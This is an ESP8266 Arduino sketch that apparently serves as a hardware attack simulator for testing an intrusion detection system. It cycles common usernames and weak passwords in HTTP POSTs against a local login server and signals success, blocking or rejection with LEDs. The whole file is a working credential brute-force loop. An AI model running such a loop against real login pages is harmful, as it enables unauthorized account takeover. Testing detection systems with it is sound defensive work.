/*
 * ESP8266 Real-time Attacker for IDPS Testing
 * 
 * This hardware-based attack simulator performs brute force attacks
 * against the IDPS system using an ESP8266 microcontroller.
 * 
 * Hardware Components:
 * - ESP8266 (NodeMCU/Wemos D1 Mini)
 * - Blue LED (Attack blocked indicator)
 * - White LED (Attack success indicator)
 * - 2x 220Ω resistors for LEDs
 * 
 * LED Indicators:
 * - Blue LED ON: Attack blocked (HTTP 403)
 * - White LED ON: Attack successful (HTTP 200)
 * - Both LEDs ON: Unknown error
 * - Both LEDs OFF: Idle state
 */

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266HTTPClient.h>

// WiFi Configuration
const char* ssid = "wifi";        // Replace with your WiFi SSID
const char* password = "password"; // Replace with your WiFi password

// Server Configuration
const char* server = "http://192.168.6.41:5000/login"; // Replace with your IDPS server IP

// LED Pin Configuration
#define BLUE_LED D5   // Blue LED for blocked attacks
#define WHITE_LED D6  // White LED for successful attacks

// Attack Credentials Arrays
String usernames[] = {"admin", "user", "test", "root", "guest"};
String passwords[] = {"123", "admin", "pass", "password", "test", "123456", "qwerty"};

void setup() {
  // Initialize Serial Communication
  Serial.begin(115200);
  Serial.println("\n=== ESP8266 IDPS Attacker Started ===");
  
  // Initialize LED pins
  pinMode(BLUE_LED, OUTPUT);
  pinMode(WHITE_LED, OUTPUT);
  
  // Turn off LEDs initially
  digitalWrite(BLUE_LED, LOW);
  digitalWrite(WHITE_LED, LOW);
  
  // Connect to WiFi
  Serial.printf("Connecting to WiFi: %s", ssid);
  WiFi.begin(ssid, password);
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  
  Serial.println("\n✅ Connected to WiFi!");
  Serial.printf("📍 Local IP: %s\n", WiFi.localIP().toString().c_str());
  Serial.printf("🎯 Target Server: %s\n", server);
  Serial.println("🚀 Starting attack simulation...\n");
}

void loop() {
  static int ui = 0; // Username index
  static int pi = 0; // Password index
  
  if (WiFi.status() == WL_CONNECTED) {
    WiFiClient client;
    HTTPClient http;
    
    if (http.begin(client, server)) {
      // Set HTTP headers
      http.addHeader("Content-Type", "application/x-www-form-urlencoded");
      http.addHeader("User-Agent", "ESP8266-Attacker/1.0");
      
      // Prepare POST data
      String postData = "username=" + usernames[ui] + "&password=" + passwords[pi];
      
      // Send HTTP POST request
      int httpCode = http.POST(postData);
      
      // Log the attack attempt
      Serial.printf("[ATTACK] %s:%s → HTTP %d", 
                   usernames[ui].c_str(), 
                   passwords[pi].c_str(), 
                   httpCode);
      
      // Handle response and control LEDs
      if (httpCode == 200) {
        // Successful login
        digitalWrite(BLUE_LED, LOW);
        digitalWrite(WHITE_LED, HIGH);
        Serial.println(" ✅ SUCCESS");
      } else if (httpCode == 403) {
        // Attack blocked by IDPS
        digitalWrite(WHITE_LED, LOW);
        digitalWrite(BLUE_LED, HIGH);
        Serial.println(" 🚫 BLOCKED");
      } else if (httpCode == 401) {
        // Invalid credentials (normal response)
        digitalWrite(BLUE_LED, LOW);
        digitalWrite(WHITE_LED, LOW);
        Serial.println(" ❌ INVALID");
      } else {
        // Unknown error
        digitalWrite(BLUE_LED, HIGH);
        digitalWrite(WHITE_LED, HIGH);
        Serial.printf(" ⚠️ ERROR (%d)\n", httpCode);
      }
      
      // Brief LED indication
      delay(300);
      digitalWrite(BLUE_LED, LOW);
      digitalWrite(WHITE_LED, LOW);
      
      http.end();
    } else {
      Serial.println("[ERROR] HTTP connection failed!");
    }
  } else {
    Serial.println("[ERROR] WiFi disconnected! Reconnecting...");
    WiFi.begin(ssid, password);
    delay(5000);
    return;
  }
  
  // Move to next password
  pi++;
  if (pi >= sizeof(passwords) / sizeof(passwords[0])) {
    pi = 0;
    ui++;
    if (ui >= sizeof(usernames) / sizeof(usernames[0])) {
      ui = 0;
      Serial.println("🔄 Completed full cycle, restarting...");
    }
  }
  
  delay(1000); // Wait 1 second before next attack
}
